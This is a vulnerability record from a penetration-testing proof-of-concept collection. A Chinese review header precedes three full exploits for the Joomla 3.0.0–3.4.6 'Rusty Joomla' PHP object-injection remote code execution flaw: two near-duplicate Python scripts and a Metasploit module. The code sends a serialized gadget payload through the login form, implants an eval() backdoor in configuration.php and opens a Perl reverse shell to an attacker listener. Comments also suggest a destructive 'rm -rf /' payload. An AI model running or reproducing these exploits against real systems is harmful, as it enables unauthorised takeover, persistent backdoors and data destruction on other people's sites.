---
source: "Mr-xn/Penetration_Testing_POC"
product: "Joomla3.0.0–3.4.6 Rusty Joomla"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Joomla-3.4.6-RCE"
prerequisites: "来源所述条件，未列明部分仍待核：登录表单可取CSRF/session，序列化存储缩短行为与旧PHP gadget可用；持久利用需configuration.php可写"
side_effects: "未执行；本文需注意的操作影响：默认持久追加配置后门和反连，与检测标识需区分；缺PHP范围/官方修复引用"
source_status: "unknown"
id: "vw-119fc4e7826d3d26c46d3985"
entity_id: "ve-119fc4e7826d3d26c46d3985"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：登录表单可取CSRF/session，序列化存储缩短行为与旧PHP gadget可用；持久利用需configuration.php可写

- **实验改动边界（1）**：POC1和2几乎同代码仅来源/注释缩进差异，需内部消重保留原作者；与222/225相同工具族可补缺失源码。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **代码与转录边界（2）**：不要与8562仅因相同gadget强并，本篇登录username/password长度变化入口与UA四字节截断不同。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（3）**：Python check生成target_url却对url发请求，取最后input当token脆弱；URL依赖末尾斜杠；-e短参不会触发lhost/lport required条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（4）**：Ruby序列化尾部s:6:return后用冒号替分号、版本按字符串比较不可靠；无重定向时check不返回成功判定。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **操作与副作用边界（5）**：默认持久追加配置后门和反连，与检测标识需区分；缺PHP范围/官方修复引用。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

### **Joomla-3.4.6-RCE**  

> exp author: twitter:@momika233
> from :https://github.com/momika233/Joomla-3.4.6-RCE
> Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6
> Version: 3.0.0 --> 3.4.6

### POC 1

```python
#!/usr/bin/env python3
 
import requests
from bs4 import BeautifulSoup
import sys
import string
import random
import argparse
from termcolor import colored
 
PROXS = {'http':'127.0.0.1:8080'}
PROXS = {}
 
def random_string(stringLength):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(stringLength))
 
 
backdoor_param = random_string(50)
 
def print_info(str):
        print(colored("[*] " + str,"cyan"))
 
def print_ok(str):
        print(colored("[+] "+ str,"green"))
 
def print_error(str):
        print(colored("[-] "+ str,"red"))
 
def print_warning(str):
        print(colored("[!!] " + str,"yellow"))
 
def get_token(url, cook):
        token = ''
        resp = requests.get(url, cookies=cook, proxies = PROXS)
        html = BeautifulSoup(resp.text,'html.parser')
        # csrf token is the last input
        for v in html.find_all('input'):
                csrf = v
        csrf = csrf.get('name')
        return csrf
 
 
def get_error(url, cook):
        resp = requests.get(url, cookies = cook, proxies = PROXS)
        if 'Failed to decode session object' in resp.text:
                #print(resp.text)
                return False
        #print(resp.text)
        return True
 
 
def get_cook(url):
        resp = requests.get(url, proxies=PROXS)
        #print(resp.cookies)
        return resp.cookies
 
 
def gen_pay(function, command):
        # Generate the payload for call_user_func('FUNCTION','COMMAND')
        template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
        #payload =  command + ' || $a=\'http://wtf\';'
        payload =  'http://l4m3rz.l337/;' + command
        # Following payload will append an eval() at the enabled of the configuration file
        #payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'test\\\'])) eval($_POST[\\\'test\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
        function_len = len(function)
        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
        return final
 
def make_req(url , object_payload):
        # just make a req with object
        print_info('Getting Session Cookie ..')
        cook = get_cook(url)
        print_info('Getting CSRF Token ..')
        csrf = get_token( url, cook)
 
        user_payload = '\\0\\0\\0' * 9
        padding = 'AAA' # It will land at this padding
        working_test_obj = 's:1:"A":O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}'
        clean_object = 'A";s:5:"field";s:10:"AAAAABBBBB' # working good without bad effects
 
        inj_object = '";'
        inj_object += object_payload
        inj_object += 's:6:"return";s:102:' # end the object with the 'return' part
        password_payload = padding + inj_object
        params = {
            'username': user_payload,
            'password': password_payload,
            'option':'com_users',
            'task':'user.login',
            csrf :'1'
            }
 
        print_info('Sending request ..')
        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
        return resp.text
 
def get_backdoor_pay():
        # This payload will backdoor the the configuration .PHP with an eval on POST request
 
        function = 'assert'
        template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
        # payload =  command + ' || $a=\'http://wtf\';'
        # Following payload will append an eval() at the enabled of the configuration file
        payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'' + backdoor_param +'\\\'])) eval($_POST[\\\''+backdoor_param+'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
        function_len = len(function)
        final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
        return final
 
def check(url):
        check_string = random_string(20)
        target_url = url + 'index.php/component/users'
        html = make_req(url, gen_pay('print_r',check_string))
        if check_string in html:
                return True
        else:
                return False
 
def ping_backdoor(url,param_name):
        res = requests.post(url + '/configuration.php', data={param_name:'echo \'PWNED\';'}, proxies = PROXS)
        if 'PWNED' in res.text:
                return True
        return False
 
def execute_backdoor(url, payload_code):
        # Execute PHP code from the backdoor
        res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS)
        print(res.text)
 
def exploit(url, lhost, lport):
        # Exploit the target
        # Default exploitation will append en eval function at the end of the configuration.pphp
        # as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')
        # e.g. get_payload('system','rm -rf /')
 
        # First check that the backdoor has not been already implanted
        target_url = url + 'index.php/component/users'
 
        make_req(target_url, get_backdoor_pay())
        if ping_backdoor(url, backdoor_param):
                print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param)
                print_info('Now it\'s time to reverse, trying with a system + perl')
                execute_backdoor(url, 'system(\'perl -e \\\'use Socket;$i="'+ lhost +'";$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\\\'\');')
 
 
if __name__ == '__main__':
        parser = argparse.ArgumentParser()
        parser.add_argument('-t','--target',required=True,help='Joomla Target')
        parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only')
        parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit')
        parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP')
        parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port')
        args = vars(parser.parse_args())
 
        url = args['target']
        if(check(url)):
                print_ok('Vulnerable')
                if args['exploit']:
                        exploit(url, args['lhost'], args['lport'])
                else:
                        print_info('Use --exploit to exploit it')
 
        else:
                print_error('Seems NOT Vulnerable ;/')
```

### POC 2 of rusty_joomla_exploit.py  

> POC 2 and POC 3 from here:https://github.com/kiks7/rusty_joomla_rce
> thannk yours

```python
#!/usr/bin/env python3
##
# Exploit Title: Rusty Joomla RCE
# Google Dork: N/A
# Date: 02/10/2019
# Exploit Author: Alessandro Groppo @Hacktive Security
# Vendor Homepage: https//www.joomla.it/
# Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6
# Version: 3.0.0 --> 3.4.6
# Tested on: Linux 4.9.184
# CVE : [if applicable]
# Technical details: https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41
# Github: https://github.com/kiks7/rusty_joomla_rce
#
# The exploitation is implanting a backdoor in /configuration.php file in the root directory with an eval in order to be more suitable for all environments.
# If you don't like this way, you can replace the get_backdoor_pay() with get_pay('php_function', 'parameter') like get_pay('system','rm -rf /')
#
#
#
#
##

import requests
from bs4 import BeautifulSoup
import sys
import string
import random
import argparse
from termcolor import colored

PROXS = {'http':'127.0.0.1:8080'}
PROXS = {}

def random_string(stringLength):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(stringLength))


backdoor_param = random_string(50)

def print_info(str):
	print(colored("[*] " + str,"cyan"))

def print_ok(str):
	print(colored("[+] "+ str,"green"))

def print_error(str):
	print(colored("[-] "+ str,"red"))

def print_warning(str):
	print(colored("[!!] " + str,"yellow"))

def get_token(url, cook):
	token = ''
	resp = requests.get(url, cookies=cook, proxies = PROXS)
	html = BeautifulSoup(resp.text,'html.parser')
	# csrf token is the last input
	for v in html.find_all('input'):
		csrf = v
	csrf = csrf.get('name')
	return csrf


def get_error(url, cook):
	resp = requests.get(url, cookies = cook, proxies = PROXS)
	if 'Failed to decode session object' in resp.text:
		#print(resp.text)
		return False
	#print(resp.text)
	return True


def get_cook(url):
	resp = requests.get(url, proxies=PROXS)
	#print(resp.cookies)
	return resp.cookies


def gen_pay(function, command):
	# Generate the payload for call_user_func('FUNCTION','COMMAND')
	template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
	#payload =  command + ' || $a=\'http://wtf\';'
	payload =  'http://l4m3rz.l337/;' + command
	# Following payload will append an eval() at the enabled of the configuration file
	#payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'test\\\'])) eval($_POST[\\\'test\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
	function_len = len(function)
	final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
	return final

def make_req(url , object_payload):
	# just make a req with object
	print_info('Getting Session Cookie ..')
	cook = get_cook(url)
	print_info('Getting CSRF Token ..')
	csrf = get_token( url, cook)

	user_payload = '\\0\\0\\0' * 9
	padding = 'AAA' # It will land at this padding
	working_test_obj = 's:1:"A":O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}'
	clean_object = 'A";s:5:"field";s:10:"AAAAABBBBB' # working good without bad effects

	inj_object = '";'
	inj_object += object_payload
	inj_object += 's:6:"return";s:102:' # end the object with the 'return' part
	password_payload = padding + inj_object
	params = {
            'username': user_payload,
            'password': password_payload,
            'option':'com_users',
            'task':'user.login',
            csrf :'1'
            }

	print_info('Sending request ..')
	resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)
	return resp.text

def get_backdoor_pay():
	# This payload will backdoor the the configuration .PHP with an eval on POST request

	function = 'assert'
	template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
	# payload =  command + ' || $a=\'http://wtf\';'
	# Following payload will append an eval() at the enabled of the configuration file
	payload =  'file_put_contents(\'configuration.php\',\'if(isset($_POST[\\\'' + backdoor_param +'\\\'])) eval($_POST[\\\''+backdoor_param+'\\\']);\', FILE_APPEND) || $a=\'http://wtf\';'
	function_len = len(function)
	final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))
	return final

def check(url):
	check_string = random_string(20)
	target_url = url + 'index.php/component/users'
	html = make_req(url, gen_pay('print_r',check_string))
	if check_string in html:
		return True
	else:
		return False

def ping_backdoor(url,param_name):
	res = requests.post(url + '/configuration.php', data={param_name:'echo \'PWNED\';'}, proxies = PROXS)
	if 'PWNED' in res.text:
		return True
	return False

def execute_backdoor(url, payload_code):
	# Execute PHP code from the backdoor
	res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS)
	print(res.text)

def exploit(url, lhost, lport):
	# Exploit the target
	# Default exploitation will append en eval function at the end of the configuration.pphp
	# as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters')
	# e.g. get_payload('system','rm -rf /')

	# First check that the backdoor has not been already implanted
	target_url = url + 'index.php/component/users'

	make_req(target_url, get_backdoor_pay())
	if ping_backdoor(url, backdoor_param):
		print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param)
		print_info('Now it\'s time to reverse, trying with a system + perl')
		execute_backdoor(url, 'system(\'perl -e \\\'use Socket;$i="'+ lhost +'";$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\\\'\');')


if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-t','--target',required=True,help='Joomla Target')
	parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only')
	parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit')
	parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP')
	parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port')
	args = vars(parser.parse_args())

	url = args['target']
	if(check(url)):
		print_ok('Vulnerable')
		if args['exploit']:
			exploit(url, args['lhost'], args['lport'])
		else:
			print_info('Use --exploit to exploit it')

	else:
		print_error('Seems NOT Vulnerable ;/')
```

### POC 3 of MSF

> file name:metasploit_rusty_joomla_rce.rb

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Joomla

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Rusty Joomla Unauthenticated Remote Code Execution',
      'Description'    => %q{
	PHP Object Injection because of a downsize in the read/write process with the database leads to RCE.
	The exploit will backdoor the configuration.php file in the root directory with en eval of a POST parameter.
	That's because the exploit is more reliabale (doesn't rely on common disabled function). 
	For this reason, use it with caution and remember the house cleaning.
	Btw, you can also edit this exploit and use whatever payload you want. just modify the exploit object with 
	get_payload('you_php_function','your_parameters'), e.g. get_payload('system','rm -rf /') and enjoy
      },
      'Author'	=>
        [
          'Alessandro \'kiks\' Groppo @Hacktive Security', 
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
		['URL', 'https://blog.hacktivesecurity.com/index.php?controller=post&action=view&id_post=41']
        ],
      'Privileged'     => false, 
      'Platform'       => 'PHP',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Joomla 3.0.0 - 3.4.6', {}]],
      'DisclosureDate' => 'Oct 02  2019',
      'DefaultTarget'  => 0)
    )

    register_advanced_options(
      [
        OptBool.new('FORCE', [true, 'Force run even if check reports the service is safe.', false]),
      ])
  end

  def get_random_string(length=50)
  	source=("a".."z").to_a + ("A".."Z").to_a + (0..9).to_a 
	key=""
	length.times{ key += source[rand(source.size)].to_s }
	return key
  end

  def get_session_token
	# Get session token from cookies
	vprint_status('Getting Session Token')
	res = send_request_cgi({
		'method' => 'GET',
		'uri' 	 => normalize_uri(target_uri.path) 
	})
	
	cook = res.headers['Set-Cookie'].split(';')[0]
	vprint_status('Session cookie: ' + cook)
	return cook
  end

  def get_csrf_token(sess_cookie)
	  vprint_status('Getting CSRF Token')

	  res = send_request_cgi({
		'method' => 'GET',
		'uri'	 => normalize_uri(target_uri.path,'/index.php/component/users'),
		'headers' => {
			'Cookie' => sess_cookie,
		}
	  })

	  html = res.get_html_document
	  input_field = html.at('//form').xpath('//input')[-1]
	  token = input_field.to_s.split(' ')[2]
	  token = token.gsub('name="','').gsub('"','')
	  if token then
		  vprint_status('CSRF Token: ' + token)
		  return token
	  end
	  print_error('Cannot get the CSRF Token ..')

  end

  def get_payload(function, payload)
	  # @function: The PHP Function
	  # @payload: The payload for the call
	  template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
	  # The http:// part is necessary in order to validate a condition in SimplePie::init and trigger the call_user_func with arbitrary values
	  payload = 'http://l4m3rz.l337/;' + payload
	  final = template.gsub('PAYLOAD',payload).gsub('LENGTH', payload.length.to_s).gsub('FUNC_NAME', function).gsub('FUNC_LEN', function.length.to_s)
	  return final
  end

 
  def get_payload_backdoor(param_name) 
	# return the backdoor payload
	# or better, the payload that will inject and eval function in configuration.php (in the root)
	# As said in other part of the code. we cannot create new .php file because we cannot use 
	# the ? character because of the check on URI schema
	function = 'assert'
        template = 's:11:"maonnalezzo":O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'                                                             
        # This payload will append an eval() at the end of the configuration file                                                                            
        payload =  "file_put_contents('configuration.php','if(isset($_POST[\\'"+param_name+"\\'])) eval($_POST[\\'"+param_name+"\\']);', FILE_APPEND) || $a=\'http://wtf\';"
	template['PAYLOAD']  = payload 
	template['LENGTH']   = payload.length.to_s
	template['FUNC_NAME'] = function 
	template['FUNC_LEN'] = function.length.to_s
        return template 

  end


  def check_by_exploiting
	    # Check that is vulnerable by exploiting it and try to inject a printr('something')
	    # Get the Session anb CidSRF Tokens
	    sess_token = get_session_token()
	    csrf_token = get_csrf_token(sess_token)

	    print_status('Testing with a POC object payload')

	    username_payload = '\\0\\0\\0' * 9
	    password_payload = 'AAA";'						# close the prev object
	    password_payload += get_payload('print_r','IAMSODAMNVULNERABLE')	# actual payload 
	    password_payload += 's:6:"return":s:102:' 				# close cleanly the object
	    res = send_request_cgi({
			'uri'	   => normalize_uri(target_uri.path,'/index.php/component/users'),
			'method'   => 'POST',
			'headers'  => 
				{
				'Cookie' => sess_token,
			},
			'vars_post' => {
				'username' => username_payload,
				'password' => password_payload,
				'option'   => 'com_users',
				'task'	   => 'user.login',
				csrf_token => '1',
			}
	    }) 
	    # Redirect in order to retrieve the output
	    if res.redirection then
		res_redirect = send_request_cgi({
			'method' => 'GET',
			'uri'	 => res.redirection.to_s,
			'headers' =>{
				'Cookie' => sess_token
			}
		})

		if 'IAMSODAMNVULNERABLE'.in? res.to_s or 'IAMSODAMNVULNERABLE'.in? res_redirect.to_s then
			return true
		else
			return false
		end
		
	    end
    end

  def check
    # Check if the target is UP and get the current version running by info leak    
    res = send_request_cgi({'uri' => normalize_uri(target_uri.path, '/administrator/manifests/files/joomla.xml')})
    unless res
      print_error("Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    # Parse XML to get the version 
    if res.code == 200 then
	    xml = res.get_xml_document
	    version = xml.at('version').text
	    print_status('Identified version ' + version)
	    if version <= '3.4.6' and version >= '3.0.0' then
		    if check_by_exploiting()
			return Exploit::CheckCode::Vulnerable
		    else
			if check_by_exploiting() then
			# Try the POC 2 times. 
				return Exploit::CheckCode::Vulnerable
			else
				return Exploit::CheckCode::Safe
			end
		    end
	    else
		    return Exploit::CheckCode::Safe
	    end
    else
	    print_error('Cannot retrieve XML file for the Joomla Version. Try the POC in order to confirm if it\'s vulnerable')
	    if check_by_exploiting() then
		    return Exploit::CheckCode::Vulnerable
	    else
		    if check_by_exploiting() then
			return Exploit::CheckCode::Vulnerable
		    else
		    	return Exploit::CheckCode::Safe
		    end
	    end
    end
  end


  
  def exploit
    if check == Exploit::CheckCode::Safe && !datastore['FORCE']
      print_error('Target is not vulnerable')
      return
    end


    pwned = false
    cmd_param_name = get_random_string(50) 

    sess_token = get_session_token()
    csrf_token = get_csrf_token(sess_token)

    # In order to avoid problems with disabled functions
    # We are gonna append an eval() function at the end of the configuration.php file
    # This will not cause any problem to Joomla and is a good way to execute then PHP directly
    # cuz assert is toot annoying and with conditions that we have we cannot inject some characters
    # So we will use 'assert' with file_put_contents to append the string. then create a reverse shell with this backdoor
    # Oh i forgot, We cannot create a new file because we cannot use the '?' character in order to be interpreted by the web server.

    # TODO: Add the PHP payload object to inject the backdoor inside the configuration.php file
    # 		Use the implanted backdoor to receive a nice little reverse shell with a PHP payload

    
    # Implant the backdoor
    vprint_status('Cooking the exploit ..')
    username_payload = '\\0\\0\\0' * 9
    password_payload = 'AAA";'						# close the prev object
    password_payload += get_payload_backdoor(cmd_param_name)		# actual payload 
    password_payload += 's:6:"return":s:102:' 				# close cleanly the object

    print_status('Sending exploit ..')


    res = send_request_cgi({
		'uri'	   => normalize_uri(target_uri.path,'/index.php/component/users'),
		'method'   => 'POST',
		'headers'  => {
			'Cookie' => sess_token
		},
		'vars_post' => {
			'username' => username_payload,
			'password' => password_payload,
			'option'   => 'com_users',
			'task'	   => 'user.login',
			csrf_token => '1'
		}
    }) 

    print_status('Triggering the exploit ..')    
    if res.redirection then
	res_redirect = send_request_cgi({
		'method' => 'GET',
		'uri'	 => res.redirection.to_s,
		'headers' =>{
			'Cookie' => sess_token
		}
	})
    end

    # Ping the backdoor see if everything is ok :/
    res = send_request_cgi({
		'method'     => 'POST',
		'uri'	     => normalize_uri(target_uri.path,'configuration.php'),
		'vars_post'  => {
			cmd_param_name  => 'echo \'PWNED\';' 
		}
	})
    if res.to_s.include? 'PWNED' then
	print_status('Target P0WN3D! eval your code at /configuration.php with ' + cmd_param_name + ' in a POST')
	pwned = true
    end


    if pwned then
        print_status('Now it\'s time to reverse shell')
		res = send_request_cgi({
		'method'     => 'POST',
		'uri'	     => normalize_uri(target_uri.path,'configuration.php'),
		'vars_post'  => {
			cmd_param_name  => payload.encoded 
		}
	})
    end

  end
end
```


---

> 来源：Mr-xn/Penetration_Testing_POC
